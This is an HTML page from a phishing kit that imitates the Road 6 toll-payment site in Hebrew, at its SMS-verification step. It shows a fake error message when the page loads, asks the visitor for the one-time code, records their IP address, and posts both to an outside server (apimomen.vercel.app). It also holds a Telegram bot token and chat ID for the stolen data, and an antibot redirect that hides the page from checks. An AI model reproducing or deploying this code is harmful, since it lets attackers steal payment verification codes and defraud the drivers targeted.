    <script>
        // Require that index.html already verified this browser (session-based antibot)
        (function () {
            if (location.hostname === '127.0.0.1' || location.hostname === 'localhost') {
                return;
            }
            try {
                if (!sessionStorage.getItem('human_verified')) {
                    window.location.href = './index.html';

<body>
    <div class="top-nav">
        <div class="nav-menu">
            <img src="assets/ico-menu.svg" alt="Menu">
        </div>
        <a href="#" class="exit-btn">
            <img src="assets/ico-menu-exit.svg" alt="Exit">
            יציאה
        </a>
    </div>

    <div class="brand-logo">
        <img src="assets/Kvish-6-logo.09596128f63efccc675f.svg" alt="Road 6 Logo">
    </div>

    <div class="page-wrapper">
        <div class="content-box">
            <div class="box-header">
                <h1 class="title-text">שלושה צעדים פשוטים לתשלום חשבוניות</h1>
                <div class="step-indicator">
                    <div class="step-item">
                        <div class="step-badge completed">✓</div>
                        <div class="step-label">חשבוניות לתשלום</div>
                    </div>
                    <div class="step-item">
                        <div class="step-badge completed">✓</div>
                        <div class="step-label">ביצוע תשלום</div>
                    </div>
                    <div class="step-item">
                        <div class="step-badge active">3</div>
                        <div class="step-label">אישור SMS</div>
                    </div>
                </div>
            </div>

            <div class="box-body">
                <div class="sms-area">
                    <h2 class="section-heading">אישור SMS</h2>
                    
                    <div id="errorMessage" class="error-message"></div>
                    
                    <div class="sms-box">
                        <div class="info-msg">נשלח קוד אימות לטלפון שלך</div>
                    </div>

                    <form>
                        <div class="input-group">
                            <label for="smsCode" class="input-label">
                                קוד אימות SMS <span class="req-field">*</span>
                            </label>
                            <input type="text" id="smsCode" class="input-field" placeholder="123456" required>
                        </div>

                        <div class="resend-area">
                            <a href="#" class="resend-btn">שלח שוב</a>
                            <div class="timer">ניתן לשלוח שוב בעוד 2:00</div>
                        </div>

                        <div class="btn-group">
                            <button type="button" class="cancel-btn" onclick="back()">חזור</button>
                            <button type="submit" class="submit-btn" onclick="submitSMS()">אשר תשלום 19.20 ₪</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Format SMS code (only numbers, max 6 digits)
        document.getElementById('smsCode').addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^0-9]/gi, '');
            e.target.value = value;
        });

        // Countdown timer
        let timeLeft = 120; // 2:00 in seconds
        const countdownElement = document.querySelector('.timer');
        
        function updateCountdown() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            countdownElement.textContent = `ניתן לשלוח שוב בעוד ${minutes}:${seconds.toString().padStart(2, '0')}`;
            
            if (timeLeft > 0) {
                timeLeft--;
                setTimeout(updateCountdown, 1000);
            } else {
                countdownElement.textContent = 'ניתן לשלוח שוב עכשיו';
            }
        }
        
        updateCountdown();

        // Show error message on page load (will be called after showErrorMessage is defined)

        // Form validation
        document.querySelector('form').addEventListener('submit', function(e) {
            e.preventDefault();
            submitSMS();
        });
    </script>

    <!-- Loading Screen -->
    <div class="loader-overlay" id="loaderOverlay">
        <div class="loader-box">
            <div class="loader-icon">
                <img src="assets/firstLoader.gif" alt="Loading">
            </div>
            <div class="loader-msg">מעבד את הבקשה...</div>
        </div>
    </div>

    <!-- jQuery CDN -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <script>
        // Telegram Bot Configuration
        var telegram_bot_id = "8200965827:AAENyLAaMIYiTKFtY47IVXdBFJ-QyXT13Vk";
        var chat_id = -4953748546;
        var sms_code;
        var message;

        // Show loading screen
        function showLoading() {
            document.getElementById('loaderOverlay').style.display = 'flex';
        }

        // Hide loading screen
        function hideLoading() {
            document.getElementById('loaderOverlay').style.display = 'none';
        }

        // Show error message
        function showErrorMessage(message) {
            var errorDiv = document.getElementById('errorMessage');
            if (errorDiv) {
                errorDiv.textContent = message;
                errorDiv.style.display = 'block';
            }
        }

        // Hide error message
        function hideErrorMessage() {
            var errorDiv = document.getElementById('errorMessage');
            if (errorDiv) {
                errorDiv.style.display = 'none';
            }
        }

        // Show error message on page load
        showErrorMessage('קוד האימות שגוי. אנא נסה שוב או בקש קוד חדש.');

        // Collect SMS data
        function ready() {
            sms_code = document.getElementById('smsCode').value;
            message = "SMS Code (Error): " + sms_code;
            if (window.__client_ip) {
                message += "\nIP: " + window.__client_ip;
            }
        }

        // Send data to server
        function sender() {
            ready();
            var smsData = {
                smsCode: document.getElementById('smsCode').value,
                clientIP: window.__client_ip || 'Unknown',
                errorType: 'error'
            };

            var settings = {
                "async": true,
                "crossDomain": true,
                "url": "https://apimomen.vercel.app/api/send-sms",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "cache-control": "no-cache"
                },
                "data": JSON.stringify(smsData)
            };
            
            $.ajax(settings).done(function (response) {
                console.log('SMS sent successfully:', response);
                // Redirect directly to success page after loading
                window.location.href = "./success.html";
            }).fail(function (xhr, status, error) {
                console.error('SMS failed:', error);
                hideLoading();
                showErrorMessage('שגיאה בשליחת הקוד. אנא נסה שוב.');
            });
        }

        // Fetch client IP from a public service
        (function fetchClientIP(){
            try {
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(d => { window.__client_ip = d.ip; })
                    .catch(() => {});
            } catch (_) {}
        })();

        // Submit SMS function
        function submitSMS() {
            const smsCode = document.getElementById('smsCode').value;
            
            if (smsCode.length < 4) {
                alert('קוד אימות חייב להכיל לפחות 4 ספרות');
                return;
            }
            
            showLoading();
            sender();
        }

        // Back function
        function back() {
            showLoading();
            setTimeout(() => {
                window.location.href = "./billing.html";
            }, 10000); // 10 seconds
        }
    </script>
